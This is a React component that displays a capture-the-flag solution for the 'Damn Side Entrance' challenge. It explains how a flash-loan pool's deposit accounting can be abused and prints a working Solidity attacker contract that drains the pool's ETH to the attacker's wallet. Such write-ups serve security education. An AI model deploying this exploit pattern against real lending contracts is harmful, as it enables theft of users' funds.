import React from 'react';
import { Accordion, Card, Badge } from 'react-bootstrap';
import { Lock, ChevronDown, AlertTriangle, Target, BookText, Zap, Code } from 'lucide-react';

const DamnSideEntrance = () => {
  return (
    <div className="mb-4">
      <h3 className="d-flex align-items-center gap-2 mb-3">
        <Lock size={20} className="text-muted" />
        Damn Side Entrance CTF Challenge
      </h3>
      
      <Accordion defaultActiveKey="0">
        <Card>
          <Accordion.Header as={Card.Header} className="d-flex justify-content-between align-items-center">
            <div className="d-flex align-items-center gap-2">
              <AlertTriangle size={18} className="text-warning" />
              <strong>View Challenge Solution</strong>
            </div>
            <ChevronDown size={18} />
          </Accordion.Header>
          <Accordion.Body>
            <Card.Body>
              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Target size={18} />
                  Challenge Goal
                </h5>
                <p>Drain 1000 ETH from the vulnerable SideEntranceLenderPool contract.</p>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <BookText size={18} />
                  Vulnerability Overview
                </h5>
                <p>The pool has these features:</p>
                <ul>
                  <li>Anyone can deposit and withdraw ETH</li>
                  <li>Provides flash loans (borrow and repay in same transaction)</li>
                  <li>Flash loan calls your contract's <code>execute()</code> function</li>
                </ul>
                <p className="mt-2">The critical vulnerability:</p>
                <p>Inside <code>execute()</code>, you can deposit the loaned ETH back using <code>deposit()</code>, which:</p>
                <ul>
                  <li>Satisfies the loan repayment condition</li>
                  <li>Credits your contract in the pool's internal balance</li>
                </ul>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Zap size={18} className="text-primary" />
                  Attack Plan
                </h5>
                <ol>
                  <li>Take a flash loan of 1000 ETH</li>
                  <li>In <code>execute()</code>, deposit the 1000 ETH back</li>
                  <li>The pool considers the loan repaid</li>
                  <li>Your contract now has 1000 ETH internal balance</li>
                  <li>Call <code>withdraw()</code> to take out the full 1000 ETH</li>
                  <li>Transfer the ETH to your wallet</li>
                </ol>
              </div>

              <div>
                <h5 className="d-flex align-items-center gap-2">
                  <Code size={18} />
                  Exploit Contract
                </h5>
                <pre className="bg-light p-3 rounded">
{`contract Attacker {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    // Step 1: Start the attack
    function attack() external {
        pool.flashLoan(1000 ether); // borrow all ETH
        pool.withdraw(); // withdraw credited deposit
        payable(owner).transfer(address(this).balance); // send to attacker
    }

    // Step 2: Pool calls this after giving us the loan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // deposit the ETH back
    }

    receive() external payable {}
}`}
                </pre>
                <p className="mt-2">The attack flow:</p>
                <ol>
                  <li>Deploy the attacker contract</li>
                  <li>Call <code>attack()</code> function</li>
                  <li>Contract receives the ETH and transfers it to your wallet</li>
                </ol>
              </div>
            </Card.Body>
          </Accordion.Body>
        </Card>
      </Accordion>
    </div>
  );
};

export default DamnSideEntrance;